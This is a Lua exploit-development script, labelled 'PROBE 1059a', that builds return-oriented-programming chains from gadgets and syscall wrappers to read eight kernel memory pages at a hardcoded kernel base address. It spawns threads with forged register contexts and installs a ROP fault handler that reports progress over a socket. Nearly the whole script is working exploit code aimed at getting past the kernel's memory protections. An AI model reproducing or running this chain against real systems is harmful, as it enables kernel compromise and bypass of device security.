-- CRASH_CLASS: HIGH
-- PROBE 1059a: step-by-step read of eight kernel pages, with handler reporting
--
-- 1058a's chain now passes a control read of a user page, but the sweep stalls after the
-- first faulting child without printing progress. This walks eight pages one at a time and
-- prints around every step, and the fault handler writes its 8-byte marker to the socket so
-- the number of completed handler invocations is visible in the capture.
local BASE  = 0xFFFFFFFF95000000

print("=== PROBE 1059a: eight-page step debug ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function as_addr(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function rq(a) local o,v=pcall(function() return memory.read_qword(uint64(a)) end) if o then return to_num(v) end return -1 end
local function hex(v) return string.format("%X", v) end
local function A(x) local ok,v=pcall(function() return as_addr(x) end) if ok and v and v>0 then return v end return 0 end

local sc_pid, sc_mmap, sc_thr, sc_ns = mk(20), mk(477), mk(430), mk(240)
print(string.format("[0] pid=%d base=%s", to_num(sc_pid(uint64(0))), hex(BASE)))

-- fault handler: report, then end the thread
local ph = gadgets.stack_pivot[1]
local ctxt = memory.alloc(8)
local hc = ropchain({ stack_base = to_num(ph.pivot_addr) })
hc:push_store_rdx_into_memory(ctxt)
hc:push_syscall_raw(syscall.write, function()
    hc:push_set_rdx(0x40)
    hc:push_set_rax_from_memory(ctxt)
    hc:push_add_to_rax(0x100)
    hc:push_set_reg_from_rax("rsi")
    hc:push_set_reg_from_memory("rdi", signal.fd_addr)
end)
hc:push_syscall_raw(mk(431), function() hc:push_set_rdi(0) end)

local pop_rax = A(gadgets["pop rax; ret"])
local ld_rax  = A(gadgets["mov rax, [rax]; ret"])
local pop_rdi = A(gadgets["pop rdi; ret"])
local st_rdi  = A(gadgets["mov [rdi], rax; ret"])
local fn      = A(syscall.pipe.fn_addr)
if pop_rax==0 or ld_rax==0 or pop_rdi==0 or st_rdi==0 or fn==0 then
  print("[!] gadget/syscall address missing; aborting"); return
end

local function mmap(px)
    local ok, a = pcall(function() return sc_mmap(uint64(0),uint64(px),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
    local v = ok and to_num(a) or 0
    if v ~= 0 and v < 0x800000000000 then for o=0,px-8,8 do wq(v+o,0) end end
    return v
end
local outbase = mmap(0x4000)
local stack   = mmap(0x10000)
local ctx = memory.alloc(0x500); local ctxa = as_addr(ctx)
local tb  = memory.alloc(8);      local tba  = as_addr(tb)
local ts  = memory.alloc(16);     local tsa  = as_addr(ts)
if outbase==0 or stack==0 or ctxa==0 or tba==0 or tsa==0 then print("[!] setup failed"); return end
print(string.format("[1] outs=%X stacks=%X ctx=%X", outbase, stack, ctxa))

local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RAX=0x078}
local function probe(i, target)
    local out = outbase + i*8
    local sp  = stack + (i % 16) * 0x1000
    local ch = { target, ld_rax, pop_rdi, out, st_rdi,
                 pop_rax, 431, pop_rdi, 0, fn }
    for j = 1, #ch do wq(sp + (j-1)*8, ch[j]) end
    for o = 0, 0x4F8, 8 do wq(ctxa + o, 0) end
    wq(out, 0xDEADBEEF)
    wq(ctxa + Ctx.MAGIC, 0x480); wq(ctxa + Ctx.TYPE, 0x10000)
    wq(ctxa + Ctx.CS, 0x43); wq(ctxa + Ctx.SS, 0x3B)
    wq(ctxa + Ctx.RIP, pop_rax); wq(ctxa + Ctx.RSP, sp); wq(ctxa + Ctx.RAX, 20)
    wq(tba, 0)
    print(string.format("  [%d] spawning %s", i, hex(target)))
    local ok, rv = pcall(function() return sc_thr(uint64(ctxa), uint64(tba), uint64(0)) end)
    print(string.format("  [%d] thr ok=%s rv=%s tid=%s", i, tostring(ok), tostring(rv), hex(rq(tba))))
    wq(tsa, 0); wq(tsa + 8, 12000000)
    pcall(function() return sc_ns(uint64(tsa), uint64(0)) end)
    print(string.format("  [%d] slept; slot=%s", i, hex(rq(out))))
    return rq(out)
end

-- control first: a user page must come back with its contents
wq(outbase + 0x2000, 0x1122334455667)
local cv = probe(8, outbase + 0x2000)
print(string.format("[C] control=%s want=1122334455667", type(cv)=="number" and hex(cv) or tostring(cv)))
if cv ~= 0x1122334455667 then print("[!] chain control failed; aborting"); return end

for i = 0, 7 do
    local v = probe(i, BASE + i*0x1000)
    print(string.format("[%d] %s = %s", i, hex(BASE + i*0x1000), type(v)=="number" and hex(v) or tostring(v)))
end
print(string.format("[E] alive pid=%d", to_num(sc_pid(uint64(0)))))
print("=== COMPLETE ===")
